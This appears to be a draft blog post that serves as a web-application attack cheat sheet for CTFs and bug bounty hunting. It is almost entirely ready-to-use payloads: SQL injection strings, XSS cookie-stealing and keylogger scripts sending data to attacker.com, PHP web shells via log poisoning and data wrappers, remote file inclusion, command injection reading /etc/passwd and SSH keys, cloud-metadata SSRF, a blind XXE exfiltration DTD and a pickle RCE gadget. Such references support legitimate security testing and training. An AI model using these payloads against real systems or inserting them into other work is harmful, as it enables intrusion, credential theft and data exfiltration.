---
title: Web Application Vulnerabilities Guide
published: 2026-01-18
description: 'Essential web vulnerabilities and exploitation techniques for CTFs and bug bounty hunting'
image: ''
tags: [Web, OWASP, CTF, BugBounty]
category: 'Notes'
draft: true
---

# Web Application Vulnerabilities Guide

A comprehensive reference for common web application vulnerabilities encountered in CTFs and real-world penetration testing.

## SQL Injection (SQLi)

SQL Injection allows attackers to interfere with database queries.

### Detection
```sql
# Basic payloads
'
"
' OR '1'='1
' OR 1=1--
admin'--
admin' #
```

### Types of SQL Injection

#### Error-Based SQLi
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' UNION SELECT NULL, @@version--
```

#### Union-Based SQLi
```sql
# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Or use UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# Extract data
' UNION SELECT NULL, table_name FROM information_schema.tables--
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username, password FROM users--
```

#### Blind SQLi - Boolean-Based
```sql
' AND 1=1--  # True
' AND 1=2--  # False

# Extract database name
' AND SUBSTRING(database(),1,1)='a'--

# Extract version
' AND SUBSTRING(@@version,1,1)='5'--
```

#### Blind SQLi - Time-Based
```sql
# MySQL
' AND SLEEP(5)--

# PostgreSQL
'; SELECT pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '00:00:05'--
```

### Automated Tools
```bash
# SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

## Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages.

### Types of XSS

#### Reflected XSS
```html
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Bypass filters
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="alert(1)">
```

#### Stored XSS
Same payloads as reflected, but stored in the database.

#### DOM-Based XSS
```javascript
# Exploiting innerHTML
"><script>alert(1)</script>

# Exploiting document.write
javascript:alert(1)
```

### Advanced XSS Payloads
```html
# Cookie stealing
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Keylogger
<script>
document.onkeypress=function(e){
fetch('http://attacker.com/?k='+e.key)
}
</script>

# Bypass WAF
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

## Local File Inclusion (LFI)

LFI allows reading arbitrary files from the server.

### Basic LFI
```bash
# Linux
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/proc/self/environ

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\logs\access.log
```

### Directory Traversal
```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

### PHP Wrappers
```bash
# Read PHP source
php://filter/convert.base64-encode/resource=index.php

# Execute commands
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Expect wrapper (if enabled)
expect://ls
```

### Log Poisoning
```bash
# Poison Apache logs
User-Agent: <?php system($_GET['cmd']); ?>

# Access log
/var/log/apache2/access.log&cmd=whoami
```

## Remote File Inclusion (RFI)

RFI allows including remote files.

```php
# Basic RFI
?page=http://attacker.com/shell.txt

# Bypass restrictions
?page=http://attacker.com/shell.txt?
?page=http://attacker.com/shell.txt%00
```

## Command Injection

Execute arbitrary system commands.

### Basic Payloads
```bash
# Command separators
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# Examples
127.0.0.1; cat /etc/passwd
127.0.0.1 | whoami
ping -c 1 `whoami`.attacker.com
```

### Bypass Filters
```bash
# Using wildcards
cat /etc/pass*
cat /etc/p?sswd

# Using variables
cat $HOME/.ssh/id_rsa
cat ${PATH:0:1}etc${PATH:0:1}passwd

# Hex encoding
echo 0x2f etc 0x2f passwd | xxd -r -p | xargs cat
```

## Server-Side Request Forgery (SSRF)

SSRF forces the server to make requests on behalf of the attacker.

### Basic SSRF
```bash
# Access internal services
http://localhost:80
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/

# AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypass filters
http://127.1
http://0.0.0.0
http://[::1]
http://2130706433 (decimal IP)
```

## XML External Entity (XXE)

XXE exploits XML parsers to read files or perform SSRF.

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

## Insecure Deserialization

Exploiting deserialization to achieve RCE.

### PHP Serialization
```php
# Example vulnerable code
unserialize($_GET['data']);

# Exploit using magic methods
O:4:"User":1:{s:4:"name";s:5:"admin";}
```

### Python Pickle
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

print(pickle.dumps(Exploit()))
```

## Directory Traversal

Access files outside the web root.

```bash
# Basic
../../../etc/passwd

# Encoded
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
```

## Authentication Bypass

### SQL Injection Auth Bypass
```sql
admin' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT 'admin', 'password'--
```

### Weak Session Management
```bash
# Predictable session IDs
# Cookie manipulation
# Session fixation
```

## File Upload Vulnerabilities

### Bypass File Type Restrictions
```bash
# Double extensions
shell.php.jpg

# Null byte injection
shell.php%00.jpg

# MIME type manipulation
Content-Type: image/jpeg

# Case sensitivity
shell.PhP
```

### Magic Bytes
```bash
# Add PNG header to PHP
echo '\x89PNG...' > shell.php
cat header.png shell.php > final.php
```

## Useful Tools

```bash
# Burp Suite - Web proxy and scanner
# OWASP ZAP - Free web scanner
# Nikto - Web server scanner
nikto -h http://target.com

# DirBuster/Gobuster - Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# WPScan - WordPress scanner
wpscan --url http://target.com --enumerate u,p,t

# SQLMap - SQL injection tool
sqlmap -u "http://target.com/page?id=1" --batch
```

## Reconnaissance Commands

```bash
# Subdomain enumeration
subfinder -d target.com
assetfinder target.com

# Technology detection
whatweb http://target.com
wappalyzer

# Wayback machine
waybackurls target.com

# Parameter discovery
arjun -u http://target.com/page
```

## Quick Testing Checklist

- [ ] Test all input fields for SQLi
- [ ] Check for XSS in all parameters
- [ ] Test file upload functionality
- [ ] Look for LFI/RFI vulnerabilities
- [ ] Test for command injection
- [ ] Check for SSRF opportunities
- [ ] Test authentication mechanisms
- [ ] Look for exposed sensitive files (robots.txt, .git, .env)
- [ ] Test for IDOR vulnerabilities
- [ ] Check HTTP headers for security misconfigurations

Remember: Always obtain proper authorization before testing any web application!
